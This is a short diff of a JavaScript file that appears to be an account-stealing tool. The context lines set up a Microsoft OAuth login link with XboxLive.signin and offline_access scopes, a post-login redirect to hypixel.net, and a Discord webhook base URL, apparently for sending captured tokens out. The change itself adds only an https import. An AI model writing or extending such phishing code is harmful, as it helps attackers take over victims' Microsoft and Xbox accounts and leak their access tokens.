@@ -7,6 +7,7 @@ const redirection = 'https://hypixel.net' //Redirects the user after they login 
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 
 //Requirements
+const https = require("https")
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const discord_api = 'https://discord.com/api/webhooks/'
